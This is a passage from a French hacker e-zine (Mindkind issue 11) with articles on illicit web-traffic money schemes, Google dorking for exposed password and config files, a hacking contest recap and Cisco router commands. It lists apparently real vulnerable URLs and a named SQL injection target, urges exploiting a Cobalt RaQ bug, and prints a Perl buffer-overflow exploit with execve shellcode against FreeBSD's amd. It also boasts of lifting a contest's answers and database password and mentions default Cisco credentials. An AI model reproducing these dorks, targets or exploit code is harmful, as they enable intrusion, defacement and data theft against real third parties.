Si vous cherchez dΘsespΘrΘment une stratΘgie illΘgale pensez a copier ceux  qui
en ont dΘja une. Par exemple les personnes qui spam "hello im virginia visit my
web site"  sur irc  ont s√rement  un bon  revenu sinon  ils ne le feraient tout
simplement pas. 


-6 Optimisation

Linux...  le  meilleur ami  de  l'entrepreneur web,  vΘritable  robot culinaire
automatisΘ et indΘpendant. Linux est la clef du succΦs d'une bonne optimisation
de stratΘgie passive  car il permet  avec de bonnes  connaissances en scripting
d'automatiser 100% des fastidieux processus exigΘs par le mΘtier. 

Par  exemple,  quelqu'un  d'intelligent  pourrait  reprendre  la  bonne vieille
technique  du  TGP  (thumbnails)  et  l'automatiser  en  entier,  ou   presque.
L'ordinateur prend les photos dans  un rΘpertoire, crΘe des thumbnails,  gΘnΦre
le fichier html et upload le tout.  Il envoie ensuite une demande de post  pour
ce mΩme site avec un message random  prit dans une mini-db de message du  genre
"hello, take my daily pics" et il soumet la requΩte a l'administrateur du site.
il  vΘrifie ensuite  combien d'argent  votre commanditaire  vous doit  et  vous
gΘnΦre un .html  qui s'inclut automatiquement  dans votre page  de dΘmarrage de
votre browser favori. 

Linux peut tout automatiser ce que l'utilisateur peut faire il s'agit seulement
se  savoir comment  lui dire,  pour de  plus amples  informations sur  le  bash
scripting avancΘ j'ai fourni un lien trΦs complet sur le sujet dans la  section
"liens utiles".

N'oubliez jamais qu'il vaut mieux passer  2 jours α scripter un robot  qui fait
votre travail que de faire ce mΩme travail α tout les jours. 


-7 Les dΘceptions du mΘtier.

Malheureusement, ce mΘtier ne comporte pas que des avantages dans ce monde tout
les acteurs sont la  pour s'enrichir et ils  ne sont pas toujours  "fair-play".
Par exemple il peut vous arriver  (et τa m'est arrivΘ souvent) de  gΘnΘrer 200$
par semaine pendant  un mois et  ne pas me  faire payer du  tout, c'est un  des
risques mais il  ne faut pas  plier. La meilleure  faτon d'Θviter une  fΓcheuse
situation comme  sa c'est  probablement de  commencer par  de petits  montants.
Limitez vos gains  α 50$ par  semaine et vΘrifiez  si votre commanditaire  vous
paye. Ensuite augmentez.

Si  vous utilisez  une stratΘgie  plus illΘgale  vous pouvez  aussi  avoir  des
problΦmes avec la justice. La  plupart des commanditaires ne vous  poursuivront
pas s'il vous attrape α tricher. Il se contenteront d'annuler votre acompte  et
de bannir votre adresse. Mais si  vous utilisez des mΘthodes dΘrivΘs pour  vous
abreuver de pions,  faites bien attention  que les gros  bonnets ne s'intΘresse
pas trop α vous. J'ai  un ami qui en est  α sa huitiΦme mise en  demeure par le
MPAA et par Microsoft.

Si  vous  Ωtes prit  dans  une situation  du  genre, ne  paniquez  surtout pas.
RemΘdiez α la situation et continuez vos activitΘs. Soyez seulement prudent  de
ne pas pousser la "vis" trop loin.
      

-8 Liens utiles :

      YnotMasters: 
      http://www.ynotmasters.com/
      Un site de ressource pour les webmaster de pages payante. 
      C'est un des meilleur endroits sur le web pour vous trouver 
      un commanditaire fiable. Ils ont un systΦme de "ranking" 
      pour les commanditaires.
      
      The Hun
      http://www.thehun.net/
      Un TGP visitΘ par plusieurs millions de personnes par jours.

      Amp Land
      http://www.ampland.com/
      Un autre TGP trΦs connu.

      Advanced Bash Scripting.
      http://www.tldp.org/LDP/abs/html/index.html
      LA rΘfΘrence en bash scripting avancΘ. vous ne trouverez 
      pas mieux c'est garanti.


-9 Conclusion
      
Voila, vous avez maintenant  les bases requises α  un bon dΘpart dans  ce monde
lucratif. Bien  sur j'aurais  pu vous  donner des  stratΘgies illΘgales mais je
prΘfΦre les garder pour  moi. Parce que je  ne suis pas vraiment  convaincu que
les divulguer serait une trΦs bonne  idΘe en regard de mon revenu.  Peu importe
ce que vous ferez, gardez toujours en tΩte une optimisation adΘquate pour faire
le moins d'effort possible. Comme τa vous pourrez passez plus de temps α  faire
autre chose de plus constructif pour l'humanitΘ comme jouer α Counter-Strike ou
convaincre des gens avec des QI de singes sur IRC que vous Ωtes dieu rΘincarnΘ.



            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /               initnull@mindkind.org                     /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'





  < Mindkind tales from IRC >
  
  [14:43] &lt;init_jobe> [14:13] *** [FunkY] has joined #mindkind
  [14:43] &lt;init_jobe> [14:15] *** [FunkY] was kicked by Amsterdam.nl.eu.undernet.org (Net Rider)
  [14:43] &lt;init_jobe> [14:20] *** [FunkY] has joined #mindkind
  [14:43] &lt;init_jobe> [14:22] *** [FunkY] was kicked by Amsterdam.nl.eu.undernet.org (Net Rider)
  [14:43] &lt;init_jobe> [14:28] *** [FunkY] has joined #mindkind
  [14:43] &lt;init_jobe> [14:30] *** [FunkY] was kicked by Amsterdam.nl.eu.undernet.org (Net Rider)
  [14:43] &lt;init_jobe> HAHA
  [14:43] &lt;init_jobe> i se zigne sur l'irc

  < ----------------------- >




                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.04  Time to do some blind hacking                   \        \     !
     .             aka                                         \        \    .
     ;           Ripping google cache without limitations       \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     

  I) :: INTRO
  -----------

 Le blind hacking est une autre de ces mΘthodes qui  vous permettent  d'arriver
 a vos fins sans avoir a connaεtre tout les moyens. Comme son nom l'indique, il
 s'agit  de hacking  "aveugle", donc  sans prΘmΘditation  . On   hack  ce   qui
 passe  entre nos mains question de se pratiquer pendant le long hivers.

 Le  blind hacking  se veut  Ωtre un  sport pure,  sans aucun  arme  ou  outils
 d'intrusion, on cherche des chose simples et ont les hacks. On peut aussi bien
 se   retrouver   entrain  de  dΘfacer  un  wwwboard   de   planetquake.com  ou
 s'emplir  le  ventre de  warez.  Le blind  hacking  n'est pas  une  chose  qui
 mΘrite  des   applaudissements, d'ailleurs  n'importe quel  cloporte peut  s'y
 mettre.

 Maintenant vous n'avez plus de raison de ne pas continuer α lire :)



  II) :: Webcrawling  the net for targets
  ---------------------------------------

 www.google.com,  vous  l'aviez   deviner? Pour  ceux   qui ne connaissent  pas
 google, il s'agit d'un excellent moteur de recherche. Google se veut   complet
 donc il y a un  tas d'options (caching de pages offlines, image searcher)  que
 la  compΘtition ne possΦde pas.

 Google balaie Internet en permanence α  l'aide de robots qui vont se  promener
 d'URL  en URL. L'avantage premier de ce systΦme c'est que l'indexation se fait
 α l'insu  de  son  auteur. A  l'aide des  bons mots,   des  mots  magiques  on
 peut obtenir   des  rΘsultats  convaincants en  trΦs peu  de temps,  jugez par
 vous-mΩmes:

   http://www.google.ca/search?q=%22index%20of%20/%22%20winex

 Les  amateurs   sauront  de   quoi  je  parle, spΘcialement   les utilisateurs
 Linux.  Les  recherches  sous   Google  se   font  donc   via  un  browser web
 (mozilla, netscape, ie, konqueror). On peut faire du blind hacking a  l'Θcole,
 α la bibliothΦque(loosers), chez sa blonde ou encore chez vos chΦres mamans.

 Pour faire une recherche, on utilise l'URL de google de la faτon suivante:

 > http://www.google.ca/search?q=Votre query 

 On peut  toujours passer  par www.google.ca directement. Pratiquez  pendant 10
 secondes, si vous comprenez  pas, sentez-vous gravement insultΘ.
 Passons donc aux ....


 III) :: Mots magiques
 ---------------------

 Vous voulez connaεtre les queries qui ont marquΘes l'histoire, les queries qui
 ont fait bouger  le monde?  Disons qu'il y a certaines sΘries de mots   reliΘs
 ensemble  sous  la forme d'une phrase qui donnent d'excellents rΘsultats.

 
 "Index of /" leech    
 ==================

 Sous Apache  et certains  autres serveurs  web se  retrouve  une  directive de
 configuration qui permet  de crΘer un  index automatique. Si  un rΘpertoire ne
 possΦde pas d'index.html, le  serveur web bouffe 100%  du I/O, swap pendant  3
 secondes et dΘcide que vous  en   avez pas et fabrique alors un  fichier index
 temporaire, en voici un exemple:

 > http://www.co.benton.or.us/sheriff/corrections/

 TrΦs  intΘressant  si vous  voulez  comprendre comment  fonctionne  un  centre
 correctionnel mais c'est pas  vraiment le trip du  siΦcle, tout ce qu'il  faut
 retenir c'est que le site  que vous avez vΘrifier est  un site qui n'a pas  eu
 d'index.html  (ou  index.php,index.asp,  defaults.html  etc..)    prΘsent.  Si
 vous  regardez   directement  www.co.benton.or.us, l'index prend le dessus  et
 on voit le site trop peu esthΘtique  du centre  de ... c'est dure α dire.

 Voici un exemple plus warez-like:

 >http://www.funet.fi/pub/netinfo/incoming/%20%20%20%20%20%20%20%20%20%20%20%20
  %20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
  %20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
  %20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
  %20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20tagged%204%20dsn!!!/

 Essayer ftp.funet.fi ? Google.com peut aussi servir de  PUB's  finder.   Comme
 la  face  d'Internet change  trΦs souvent,  la variΘtΘ  persiste :),  l'astuce
 c'est de chercher des "index of /" avec des mots comme  incoming et tagged.

 On peut  aussi trouver  du matΘriel  directement, quoi  que  cela  soit  moins
 simple,  des qu'il  s'agit de warez,  certains modifient l'index  de leur site
 pour contenir "index of /" et vous envoie de la junk.  

 Chercher leech,  0-day et  rarement warez  ou appz  si vous  voulez Θviter les
 popups :)

 > http://www.fh-trier.de/~teepenf/leech/


 Un aspect   encore  plus   intΘressant que   les  autres,   le  hacking,  peut
 Ωtre  trΦs  facilement simplifiΘ  par Google.com,  en voici  une exemple, trΦs
 ordinaire soit dit  en passant:

 >  www.google.ca/search?q="index of /" passwd.txt

 - http://earlyamerica.com/towncrier/passwd.txt
 - http://www.ku.edu/~philos/courses/wwwboard3/passwd.txt
 - http://ntuphoenix.port5.com/discus_admin_1162549908/passwd.txt

 Hacker des webboards c'est bien mais on veut mieux non? 

 >  www.google.ca/search?q="index of /" config.inc.php.bak

 - http://planetemods.free.fr/include/config.inc.bak

 Il y  a toujours  la possibilitΘ  de faire  du dΘfacing   (changer   la   page
 d'accueil, peut-Ωtre mΩme avoir accΦs α la machine ou du moins α  la  bd).  On
 peut   par  exemple chercher le fichier access_log et error_log pour  vΘrifier
 au cas ou.

 Je crois que tout le monde a comprit.

 Stats / Usages data 
 ===================

 Il y a beaucoup  de proxy web sur  Internet, qui logs bien  entendu toutes les
 requΩtes,  la majoritΘ de ces proxies gΘnΦrent un log en HTML et le place dans
 un rΘpertoire.

 Exemple?

 > http://www.google.ca/seach?q="World Wide Web Access Statistics"

 - http://gladstone.uoregon.edu/monthly-log.html
 - http://www.soest.hawaii.edu/reports/statistics.html

 Vous  pouvez  ajouter    des  mots   a  la   query  pour   chercher un   terme
 intΘressant  (ie:passwd.txt).   Remercier  wwwstat   d'avoir  un   pattern  si
 rΘpΘtitif, les   logs  gΘnΘrer par   ce  script  sont vraiment trop  parfaits.
 Nous avons toute l'information nΘcessaire.

 Il y a aussi "FTP Access Statistics" qui peut  vous donnez du bon miammiam.



 Debug/Error messages
 ====================

 Les  messages d'erreurs,  sont selon  moi, un  truc trΦs  utile, je  me  sert
 principalement des messages  d'erreurs pour  dΘterminer  le OS et  information
 diverse  en rapport  α  une  cible. Je  recherche principalement  2 sortes  de
 messages d'erreurs,  les messages  gΘnΘrΘs par  ASP,PHP et  SQL. Pratique pour
 localiser  par  exemple  des  cas  assujettis  au  SQL injection.

 "Microsoft OLE  DB Provider  for ODBC"  est un  bon keyword  pour trouvez  des
 scripts   qui  accΦdent   α  des  bases  de  donnΘe,  l'erreur  n'est  pas  si
 intΘressante  que  τa.  Mais   mΩme  si  le  script ne  fait  plus  le message
 d'erreur, il  est   toujours  la  passerelle  pour l'injection.


 &lt;REALTIME_DRAMATIZATION>
 Tiens, en Θcrivant ses lignes, jai par hasard attrapΘ ceci via irc:

 (Need Help?: http://www.securiteam.com/securityreviews/5DP0N1P76E.html)

 http://new.spot.be/tiscali/fr/film.asp?Code_film='7957 (SQL injection
                                                           possibility)

 Merci init_null ;)
 &lt;/REALTIME_DRAMATIZATION>

 Il   y  a   les   messages    typiques  de   PHP3, le   plus  populaire   est
 toujours:  "Fatal  error:  input  in flex  scanner  failed  in  ". Ce  message
 d'erreur   est  souvent associΘ α une fonction include() qui inclue  n'importe
 quel fichier  et  l'affiche   ou le traite. Il y a alors possibilitΘ de  faire
 un tas de trucs, comme  cet article  se veut court,  voici un lien vers un  de
 mes vieux articles sur le sujet:

 http://ouah.sysdoor.net/art001.txt

 Vous  pouvez   aussi  chercher    pour  des   patterns d'erreurs  PHP typiques
 contenant des "unable to" et compagnie.

 CONCLUSION & Hunting tricks
 ===========================

 Je crois qu'on pourrait  y passer la semaine,  alors ceci cl⌠t cet  article en
 espΘrant que cela vous ai amusez. Voici quelques idΘes a essayer pour ceux que
 τa intΘresse:

-  Utiliser  http://www.cgisecurity.com/archive/index.shtml   pour  trouver  de
   nouveaux patterns α vΘrifier, si par un exemple une nouvelle  faille sort, α
   partir d'un exploit vous pourrez toujours savoir quel fichier  chercher,  si
   vous glissez allinurl: devant votre query, google  ne cherchera que dans les
   liens. Donc vous trouverez les fichiers vulnΘrables.

 - Exploiter le nouveau bug overflow.cgi pour les RAQ applicances. Chercher des
   machines de ce type en utilisant un pattern d'erreur 404.En effet,  les  RAQ
   affichent une page 404 bien a elles, voici un exemple de page 404:

   > http://pgs.k12.va.us/tech/wm
   
   Dans le source on peut voir la source de l'image suivante:
  
   "/.cobalt/images/question_warning"

   On n'a plus qu'α chercher cela, essayer le Images search de google.
   Pour l'exploit en question:
  
   http://www.securiteam.com/exploits/6S0022A6AA.html

 - Allez lire la doc sur google.com pour amΘliorer vos  queries  de  recherche,
   le adv. search est pas mal aussi pour les URL search/Domain search.

 - Pour avoir tout les bugs de sΘcuritΘs rΘpandus de  type  cgi/database,  vous
   pouvez toujours downloader les fichiers contenant  les  "rules"  de  NESSUS.
   TrΦs facile α parser et α rΘutiliser. (En fait c'est un  langage  interprΘtΘ
   rΘutilisable)



                                                                            __2



            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                  mrgibson@golum.net                     /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'





------------------------------- 8< cut here 8< -------------------------------


#!/usr/bin/perl
#
# Fbsd AMD exploit, dosen't give root since it's not seuid.
#
###########################################################
my $shout = "MindKind_Is_Da_Bomb!";
my $coder = "FunkY"; 
###########################################################

my $execv = "\x31\xc0\x50\x50\xb0\x17\xcd\x80". 
            "\x31\xc0\x50\x50\xb0\xb5\xcd\x80".  
	    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f" .
            "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53" .
            "\xb0\x3b\x50\xcd\x80";


my $ret   = "\x08\xf6\xbf\xbf";
my $head  = 700;       
my $body  = 200;
my $tail  = 85;
my $buf;
                              
#                   .:[Building buffer]:.
 
 $buf .= $shout x($head/20);
 $buf .= "\x90"x($body-length($execv));
 $buf .= $execv;
 $buf .= $coder x($tail/5);
 $buf .= $ret; 

#                 .:[Exploitation Starts]:. 
 
 system("/usr/sbin/amd", "-k" , "$buf");


------------------------------- 8< cut here 8< -------------------------------





                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.05   Centinel Hacking Countest                      \        \     !
     .             aka                                         \        \    .
     ;                    veni,vidi,vici                        \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     

Le 9 octobre dernier au soir, avait lieu α l'UniversitΘ Laval α QuΘbec dans  le
cadre du Congres ╔tudiant sur  les Nouvelles  Technologies de l'INformation  et
de l'╔Lectronique un concours de hacking. C'est la premiΦre fois qu'avait  lieu
au QuΘbec un ΘvΘnement de la sorte. Le concours avait lieu α QuΘbec mΩme. Ville
o∙ la majoritΘ des grands groupes  de hackers QuΘbΘcois est nΘe, Northern  Phun
co, Corrupted-Addict  et Illegal  Granted Access.  L'ΘvΘnement a  ΘtΘ publicisΘ
dans  l'underground  notamment  grΓce   au  vivotant  groupe  Pyrofreak   et  α
l'organisation 2600mtl.


Une quarantaine de  participant et une  vingtaine de bΘnΘvole  ont participΘ au
projet. Parmi les concurrents connu de  la scΦne on retrouvais BMG de  2600mtl,
Nitrogen et Binf de devhell ainsi  que moi mΩme (Wyzeman), __2 et  Qwzykx avons
dΘcidΘ de participer au  concours sous le couvert  de notre ancien groupe  IGA.
Phaust de C-A est venu faire sont tour et nous jaser un peu. mtadbf mieux connu
sous le nom de Bond007 ne pouvait participer au concours puisqu'il  connaissait
trop les organisateurs et  se serait retrouvΘ en  conflit d'intΘrΩt, il a  donc
participΘ α  l'ΘvΘnement en  tant que  pseudo organisateur.  Patoff et  Spyd de
Pyrofreak Θtait aussi de l'ΘvΘnement,  mais n'ont pas participΘ. Pour  le reste
des concurrents ils Θtaient  de nature inconnue. Ce  qui porte α croire  que la
scΦne QuΘbΘcoise est un peu plus grande que celle connue, mais trΦs peu d'entre
eux on performer, ce qui explique de fait, leurs natures inconnues.


Le concours Θtait divisΘ en 2 parties, une composΘe de 8 levels portant sur des
mΘthodes  de  hacking  connu,  tel  le  sql  injection,  les  buffers  overflow
d'argument et  d'environnement, ainsi  que un  format string  bug. La  deuxiΦme
partie Θtait constituΘe d'une vingtaine  de machines α hacker freestyle,  o∙ le
but Θtait pas mal d'avoir les bons outils et d'avoir leecher toute les exploits
0  day des  6 derniers  mois, cette  parti du  concours a  ΘtΘ en  fait  plut⌠t
dΘlaisser  par  les concurrents.  Avant  le dΘbut  du  concours, 2  confΘrences
Θtaient offertes gratuitement aux concurrents.  Une sur les IDS α  laquelle moi
et __2 sommes  arrivΘs en plein  milieu, encore sous  les effets du  weed. Nous
nous sommes vite rendu  compte que cette confΘrence  donnΘe par un bΘnΘvole  de
Linux  QuΘbec ne  s'adressait pas  α nous  (aprΦs tout,  je venais  quand  mΩme
d'Θcrire un article sur  le sujet mΩme pas  2 mois avant). Cependant  nous nous
sommes rendu compte que bon nombre de participants Θtaient impressionnΘs par la
confΘrence. Ce qui  nous a permit  de douter un  peu sur le  challenge que nous
offrirait les concurrents  du concours. DΘτu  par la premiΦre  confΘrence, nous
avons  dΘcidΘ  de ne  pas  assistΘ α  la  seconde, se  disant  qu'elle ne  nous
apporterait pas grand chose de plus  que la premiΦre. Mtadbf est d'accord  avec
nous pour dire que  les confΘrences Θtaient un  peu mΘdiocre, non pas  qu'elles
Θtaient fonciΦrement  mauvaises mais  elles devaient  s'adresser α  des hackers
chevronnΘs, du moins c'est ce que nous croyons. Pourtant elles ont tout de mΩme
intΘressΘ une majoritΘ de participant.


Le hackfest dΘbuta officiellement α la fin des 2 confΘrences vers 9h du soir et
devait s'Θtendre jusqu'a 3 heure du matin. Qui a gagnΘ ? nous, bien  Θvidement,
malgrΘ le fait que les favoris de la scΦne Θtaient nitrogen et binf de devhell,
qui sont ma foi particuliΦrement surestimΘs. Nous avons Θvidement ΘtΘ accusΘ de
tricher, amusant  non, tricher  dans un  concours de  hack. Effectivement, nous
n'avons pas suivit  le chemin que  les organisateurs auraient  bien aimΘs qu'on
suive. Voici ce que nous avons vraiment  fait. AprΦs avoir rΘussi les #1 #3  et
#4, __2  a  dΘcouvert en faisant  un ps -aux  un deamon qui  avait pour but  de
tenir live les statistiques du concours  (quel groupe est rendu o∙). Le  deamon
ayant pour argument un  fichier dans le path  du site web. Par  curiositΘ, nous
sommes allez voir si nous ne pouvions pas avoir accΦs au site web (les #4 #5 #6
#7 et #8 qui  Θtait des buffer overflow  et format string bug,  se faisaient en
local sur la machine du concours grΓce  α un shell au quel nous avions  accΦs).
Quel ne fut pas notre grande surprise de dΘcouvrir hardcodΘ dans le fichier php
qui s'occupait  de filtrer  les rΘponses  des concurrents,  les rΘponses du dit
concours, nous avons aussi trouvΘ le pass  de la bd mysql dans les fichier  php
du site  (les 3  premiΦres questions  Θtait web  based). Un  seul numΘro nous a
cependant ΘtΘ  crΘditΘ pour  ce hack.  N'ayans plus  aucun intΘrΩt  au concours
(aprΦs tout  nous avions  le sentiment  justifier d'avoir  gagnΘ), nous  sommes
parti. Il Θtait minuit. Les 3 heures restantes au concours n'ont pas suffit aux
autres groupes, notamment les favoris, devhell (qui soutiennent que s'ils n'ont
pas rΘussi α nous battre c'est qu'ils Θtaient frost et qu'ils ont quittΘ avant,
et bien c'est aussi notre  cas et on a gagnΘ,  alors bien piΦtre excuse que  la
leur) pour battre les 4 numΘro que nous avions rΘussi. Il est aussi amusant  de
savoir que IGA a ΘtΘ le seul groupe a rΘussir un des problΦmes sur les  buffers
overflows et que nous Θtions sur le bord d'en rΘussir un deuxiΦme lorsque  nous
avons fait notre coup d'Θclat. Donc mΩme sans tricher nous aurions tout de mΩme
gagnΘ,    les     rΘsultats    donnΘs     sur    le     site    du     hackfest
(http://hackfest.centinel.org/) sont la pour en tΘmoigner.


Temps : 20:50:38  NumΘro :  1   Nom:  iga
Temps : 21:36:40  NumΘro :  2   Nom:  bleh
Temps : 21:41:56  NumΘro :  3   Nom:  kohi
Temps : 21:43:12  NumΘro :  2   Nom:  kohi
Temps : 21:47:39  NumΘro :  1   Nom:  kohi
Temps : 22:05:19  NumΘro :  1   Nom:  dh
Temps : 22:24:46  NumΘro :  2   Nom:  dh
Temps : 22:55:16  NumΘro :  4   Nom:  iga
Temps : 23:02:49  NumΘro :  2   Nom:  iga
Temps : 23:03:02  NumΘro :  3   Nom:  iga
Temps : 23:46:25  NumΘro :  1   Nom:  R
Temps : 23:58:19  NumΘro :  2   Nom:  R
Temps : 00:10:25  NumΘro :  1   Nom:  Megaoctet


Sommes toutes  l'ΘvΘnement a  bien plut  α plusieurs.  Les perdants, outre nous
accuser d'avoir tricher, clament haut et fort que le but n'Θtait pas de  gagner
mais de participer. Je ne sais pas si ils se croient vraiment, mais si oui,  il
s'agit la  d'un belle  exemple de  la mΘdiocritΘ  QuΘbΘcoise, qui  affecte mΩme
notre Underground.  Le seul  et unique  but d'un  concours gΘnΘralement  est de
dΘclarer un gagnant. Et bien soit, continuΘ α jouer les perdants comme il  vous
plait tant, nous nous allons continuer α faire Θvoluer la scΦne QuΘbΘcoise pour
l'amener au sommet et soyez sur  qu'on vous laissera pas salir notre  image. Il
est tout de  mΩme plaisant de  savoir que les  organisateurs ont apprΘciΘ  leur
expΘrience et  on promit  de recrΘer  l'ΘvΘnement l'an  prochain. Nous espΘrons
tout de fois que  la qualitΘ des concurrents  sera supΘrieure l'an prochain  et
que le  kiddie qui  a fait  du arp  poisoning toute  la soirΘe aura comprit que
c'est pas sa place.  Donnons-lui tout de mΩme  le crΘdit d'avoir donnΘ  quelque
chose α dire α Spyd pendant un mois.


                                                                └ l'an prochain
								
									Wyzeman


            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                wyzeman@mindkind.org                     /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'
	  





        ____         ,-------------------------------------------------
       /    \        |
      |  _   |       | Mindkind's open source software of the zine
      | / \  |       | -Eraser
      ||   | |      /  http://sourceforge.net/projects/eraser/
      (.) (.)|     /   Eraser est un utilitaire sΘcure pour effacer ses 
      ||   | |    <__  fichiers. Comme tout le monde le sait, il est 
      ||   | | |     | possible de retrouver des donnΘes effacΘes mΩme 
      ||   | | |     | aprΦs avoir vidΘ la corbeille. Sans trop entrer
      |____/|| |     | dans les dΘtails, Eraser efface les documents de
      |\___/ | |     | faτon tout α fait permanente (quoi que 10 fois 
      ||   | | |     | plus lente). Eraser fonctionne uniquement sous 
      ||   | | |     | Windows.
      ||   | | |     | 
      ||     | |       
      | \___/  |      
      |        |        
       \______/        
                  




                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.06 Internet platiquΘ 1                              \        \     !
     .             aka                                         \        \    .
     ;       Ta fini avec ta foutu thΘorie, jveux mon CCNA      \        \   :
     :  yaka Avez-vous dΘjα touchΘ un (Cisco) CLI?              \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     

Dans la suite de mes articles  thΘoriques sur "Internet", voici donc un  peu de
pratique pour se dΘgourdir les doigts...

Let's hack some Ciscos
»»»»»»»»»»»»»»»»»»»»»»
Bon j'ai genre le livre de CCNA dans les mains.. et... FUCK IT.
Vous le lirez (disponible chez tout les bons bookwarez-doodz).
On va s'amuser α place :-)

Bon primo on va  rΘgler quelque chose assez  vite. Ya des routers  Cisco et des
switchs Cisco. Ya diffΘrentes  sortes de routers et  switchs, mais en gros  les
commandes se ressemble pas  mal. Voici ceux qu'on  va regarder : Cisco  GSR: τa
ctun  CRISS  de  gros  cisco.  Le  genre  qui  roule  une  couple   d'interface
OC192/OC48/GigabitEthernet/Ethernet et qui fait beaucoup de bruit. ╟a ressemble
α 2 grosses caisses. Une avec des cartes cutes  que c'est marquΘ  OC192 ou OC48
dessus et qu'on plug les fibres en avant et l'autre qui a d'l'air d'Ωtre fermΘe
(qui doit Ωtre une espΦce de contr⌠leur) et qu'on branche le reste en  arriΦre.
D'habitude le # de modΦle des GSR  cΘ dans les 12000. Cisco 2600 :  router plus
"standard" et plus compact que le GSR. Contient des interfaces FastEthernet  et
GigabitEthernet.  Ressemble  α une  boite  α pizza.  On  branche les  cΓbles  α
l'arriΦre. Cisco 3500 : Switch assez standard. Ressemble α un Cisco 2600 (style
pizza box) mais d'habitude  sur une switch on  plug beaucoup plus de  ports. ╟a
peut Ωtre 8 ou 24, en GigabitEthernet et/ou en FastEthernet.

Ces 3 machines lα ont donc un prompt similaire :


User Access Verification

Password:
JessicaAlba>enable
Password:
JessicaAlba#

La commande "enable" sert α rentrer dans un mode de config complet. Moi c'Θtait
cisco/cisco le username/pass, mais  je crois pas que  τa va Ωtre la  mΩme chose
pour vous.  La box  que vous  avez le  plus de  chance d'avoir  τa comme mot de
passe, c'est  une box  qui sert  aux "tests".  Genre dans  un CΘgep/UniversitΘ.
Aussi le prompt est settΘ avec le nom identifiant du Cisco; Dans le prΘsent, le
nom va Ωtre JessicaAlba pour le GSR, AngelinaJolie pour le 2600 et KirstenDunst
pour la switch(pour garder votre attention, et surtout pour pouvoir jouer  dans
les setups intimes des interfaces de ces demoiselles.. he he he).

Dans tout bon  Cisco ya des  commandes de base.  Que ce soit  un router ou  une
switch, la commande  va Ωtre disponible.  La premiΦre et  derniΦre commande que
vous avez α  apprendre lorsque vous  avez un cisco  dans les mains,  c'est "?".
Vous  pouvez  placer  le "?"  n'importe  ou  dans une  ligne  de  commande avec
plusieurs  paramΦtres,  et  α  chaque  fois  le  cisco  vous  donne  les  choix
disponible.

Mais bon, je vais Ωtre gentil et je vais prendre en considΘration que vous avez
pas de Cisco (aprΦs tout c rare de  quoi en bas de 20 000$ :-). Voici  donc les
outputs des helps. Pis vu que jme sens cheap de juste paster du stock de  mΩme,
je vais commenter un ti peu.. (commentaires C style // τa va Ωtre moi)

GSR:
JessicaAlba#?   
Exec commands:
  <1-99>           Session number to resume
  access-enable    Create a temporary Access-List entry
  access-profile   Apply user-profile to interface
  access-template  Create a temporary Access-List entry
  archive          manage archive files
  attach           Console for LineCard
  calendar         Manage the hardware calendar
  cd               Change current directory 
                   // Et oui ya un filesystem sur un GSR
  chain-cache      Control parser chain-cache
  clear            Reset functions
  clock            Manage the system clock
  cns              CNS subsystem
  configure        Enter configuration mode 
                   // Pour passer α l'autre mode supΘrieur
  connect          Open a terminal connection
  copy             Copy from one file to another
  debug            Debugging functions (see also 'undebug') 
                   // plut⌠t cool permet de voir
                   // en temps rΘel ce qui se passe.. genre les users qui se
                   // log, ce que la machine fait, peut mΩme dΘbugger packet
                   // par packet (α ne pas conseiller sur une interface a 
                   // haut dΘbit.. hehe)
  delete           Delete a file
  diag             Launch Cisco Field Diagnostics
  dir              List files on a filesystem // me semble c'est pas un HD
                                              // c juste de la "flash" genre..
  disable          Turn off privileged commands
  disconnect       Disconnect an existing network connection
  enable           Turn on privileged commands
  erase            Erase a filesystem // Kc que je disais sur le FS :-)
  execute-on       Execute command remotely
  exit             Exit from the EXEC
  facility-alarm   Alarm commands
  format           Format a filesystem
  help             Description of the interactive help system
  hw-module        Control of individual components in the system
  lock             Lock the terminal
  login            Log in as a particular user
  logout           Exit from the EXEC
  mkdir            Create new directory
  monitor          Monitoring different system events // Peut Ωtre intΘressent
                   // pour voir qui se connect sur la machine et etc...
  more             Display the contents of a file
